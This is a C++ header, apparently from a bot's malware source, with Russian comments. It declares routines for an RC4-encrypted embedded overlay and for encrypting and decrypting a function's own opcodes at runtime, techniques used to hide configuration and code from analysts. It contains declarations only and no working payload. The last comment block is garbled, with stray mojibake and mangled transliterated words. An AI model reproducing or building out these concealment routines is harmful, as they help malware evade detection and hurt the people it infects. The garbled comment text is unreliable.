/*
  Базовый оверлей для бота, и функции связаные с ним.
*/
#pragma once

namespace BaseOverlay
{  
  enum
  {
    MAGIC_DWORD          = 0x45564144, //Magicheskeo Chiles (DAVE).
    FULL_SIZE_OF_OVERLAY = 512,        //Full maximum size of the overlay after the crypt.
  };
  
  /*
    Инициализация.
  */
  void init(void);

  /*
    Деинициализация.
  */
  void uninit(void);

  /*
    Загрузка оверлея.

    OUT buffer         - буфер для данных оверлея. Должен быть размером не менее
                         FULL_SIZE_OF_OVERLAY.
    IN overlay         - адрес зашифрованого оверлея.
    IN OUT overlaySize - на входе - размер overlay. На вызходе - размер данных оверлея.
    IN rc4Key          - ключ шифрования. Может быть NULL.

    Return             - true - в случаи успеха,
                         false - в случаи ошибки.
  */
  bool _loadOverlay(void *buffer, const void *overlay, LPDWORD overlaySize, const Crypt::RC4KEY *rc4Key);
  
  /*
    Создание оверлея.

    OUT overlay - адрес по которому будет записан оверлей.
    IN data     - данные оверлея.
    IN dataSize - размер данных оверлея.
    IN rc4Key   - ключ шифрования. Может быть NULL.

    Return      - true - в случаи успеха,
                  false - в случаи ошибки.
  */
  bool _createOverlay(void *overlay, const void *data, WORD dataSize, const Crypt::RC4KEY *rc4Key);
  
  /*
    Получение адреса оверлея.

    IN mem    - данные, в которых будет произхводиться.
    IN size   - размер mem.
    IN rc4Key - ключ шифрования. Может быть NULL.
    
    Return    - адрес оверлея, или NULL - в случаи ошибки.
  */
  void *_getAddress(const void *mem, DWORD size, const Crypt::RC4KEY *rc4Key);

  /*
    Дешифрование опкодов функции.

    IN OUT curOpcode - первый криптованный опкод.
    IN size          - полное кол. криптованнызх байт.
    IN key           - ключ.
  */
  void _decryptFunction(LPBYTE curOpcode, DWORD size, DWORD key);

  /*В В В В Encryption opcodes up to the first meeting of RET.

В В В В IN OUT curOpcode - a starting point.
В В В В IN key - the key.

В В В В Return - zakriptovan number of bytes.
В В */
  DWORD _encryptFunction(LPBYTE curOpcode, DWORD key);
};
